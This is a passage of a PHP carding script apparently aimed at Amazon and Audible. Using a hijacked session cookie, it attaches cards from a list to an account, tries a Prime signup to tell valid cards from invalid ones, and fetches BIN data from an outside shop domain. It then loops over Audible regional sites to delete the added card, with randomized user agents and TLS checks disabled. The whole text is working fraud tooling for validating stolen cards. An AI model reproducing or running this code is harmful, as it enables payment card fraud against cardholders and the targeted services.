CURLOPT_POSTFIELDS     => "ppw-jsEnabled=true&ppw-widgetState=".$walletid2."&ppw-widgetEvent=SavePaymentPreferenceEvent",
CURLOPT_HTTPHEADER     => array(
"Host: www.$cookieUS1",
$headers[] = "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS ".rand(10,99)."_1_2 like Mac OS X) AppleWebKit/".rand(100,999).".1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E".rand(100,999)." Safari/".rand(100,999).".1",
"content-type: application/x-www-form-urlencoded",
),
]);
$result = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$walletid = getstr($result, 'preferencePaymentMethodIds":"[\"','\"');

if ($walletid == null) {

die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Falha ao obter walletid. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@Oxnebor</span><br>');

}

///////////////////////////////////////////////////////////////////////////////////////
 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.'.$cookieUS1.'/hp/wlp/pipeline/actions?redirectURL=L2dwL3ByaW1l&paymentsPortalPreferenceType=PRIME&paymentsPortalExternalReferenceID=prime&wlpLocation=prime_confirm&locationID=prime_confirm&primeCampaignId=SlashPrime&paymentMethodId='.$walletid.'&actionPageDefinitionId=WLPAction_AcceptOffer_HardVet&cancelRedirectURL=Lw&paymentMethodIdList='.$walletid.'&location=prime_confirm&session-id='.$sessionds.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie2);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie2);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.'.$cookieUS1.'';
$headers[] = 'Cookie: '.$cookie2.'';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$Fim = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$urlbin = 'https://chellyx.shop/dados/binsearch.php?bin='.$cc.'';
$infobin = file_get_contents($urlbin);

///////////////////////////////////////////////////////////////////////////////////////

$tokens = array(
    "audible.com",
    "audible.de",
    "audible.it",
    "audible.es",
    "audible.co.uk",
    "audible.com.au",
    "audible.ca",
    "audible.co.jp",
    "audible.fr"
);

///////////////////////////////////////////////////////////////////////////////////////

foreach ($tokens as $host1111) {

    $lastDotPosition = strrpos($host1111, '.');
    if ($lastDotPosition !== false) {
        $aftehost1111rLastDot = substr($host1111, $lastDotPosition + 1);
        if ($aftehost1111rLastDot === 'com') {
            $aftehost1111rLastDot = 'US';
        }
    }

    $cookie2 = convertCookie($cookieprim, strtoupper($aftehost1111rLastDot));

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => 'https://www.'.$host1111.'/account/payments?ref=',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_COOKIE         => $cookie2,
        CURLOPT_ENCODING       => "gzip",
        CURLOPT_POSTFIELDS     => "",
        CURLOPT_HEADER         => true,
        CURLOPT_HTTPHEADER     => array(
            'Host: www.'.$host1111,
            'sec-ch-ua: "Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'Upgrade-Insecure-Requests: 1',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Sec-GPC: 1',
            'Accept-Language: pt-BR,pt;q=0.9',
        ),
    ]);
    $r = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpcode == 429) {
        continue;
    }

    $csrf = getstr($r, 'data-csrf-token="', '"');
    if (stripos($csrf, '///')) {
        $c = getstr($r, 'data-payment-id="', 'payment-type');
        $csrf = getstr($c, 'data-csrf-token="', '"');
    }
    $address = getstr($r, 'data-billing-address-id="', '"');
    $cookie2 = convertCookie($cookieprim, strtoupper($aftehost1111rLastDot));

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => 'https://www.'.$host1111.'/unified-payment/deactivate-payment-instrument?requestUrl=https%3A%2F%2Fwww.'.$host1111.'%2Faccount%2Fpayments%3Fref%3D&relativeUrl=%2Faccount%2Fpayments&',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_COOKIE         => $cookie2,
        CURLOPT_ENCODING       => "gzip",
        CURLOPT_HEADER         => true,
        CURLOPT_POSTFIELDS     => "paymentId=".$payment."&billingAddressId=".$address."&paymentType=CreditCard&tail=0433&accountHolderName=Teste&csrfToken=".urlencode($csrf),
        CURLOPT_HTTPHEADER     => array(
            'Host: www.'.$host1111,
            'sec-ch-ua: "Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
            'Content-type: application/x-www-form-urlencoded',
            'X-Requested-With: XMLHttpRequest',
            'sec-ch-ua-mobile: ?0',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            'sec-ch-ua-platform: "Windows"',
            'Accept: */*',
            'Sec-GPC: 1',
            'Accept-Language: pt-BR,pt;q=0.9',
            'Origin: https://www.'.$host1111,
            'Referer: https://www.'.$host1111.'/account/payments?ref=',
        ),
    ]);
    $r = curl_exec($ch);
    curl_close($ch);

    if (strpos($r, '"statusStringKey":"adbl_paymentswidget_delete_payment_success"')) {
        $msg = '✅';
        $err = "Removido: $msg $err1";
        break;
    } else {
        $msg = '❌';
        $err = "Removido: $msg $err1";
    }
}

///////////////////////////////////////////////////////////////////////////////////////

if (strpos($Fim, 'We’re sorry. We’re unable to complete your Prime signup at this time. Please try again later.')) {

die('<span class="text-success">Aprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Cartão vinculado com sucesso. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@Oxnebor</span><br>');

}elseif (strpos($Fim, 'Lo lamentamos. No podemos completar tu registro en Prime en este momento. Si aún sigues interesado en unirte a Prime, puedes registrarte durante el proceso de finalización de la compra.')) {

die('<span class="text-success">Aprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Cartão vinculado com sucesso. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@Oxnebor</span><br>');

}elseif (strpos($Fim, 'InvalidInput')) {

die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Cartão inexistente. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@Oxnebor</span><br>');

}elseif(strpos($Fim, 'If you would still like to join Prime you can sign up during checkout')) {

die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Limite de tentativas. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@Oxnebor</span><br>');

}elseif (strpos($Fim, 'HARDVET_VERIFICATION_FAILED')) {

die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Cartão inexistente. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@Oxnebor</span><br>');

} else {

die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Erro interno - Amazon API </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@Oxnebor</span><br>');

}

?>
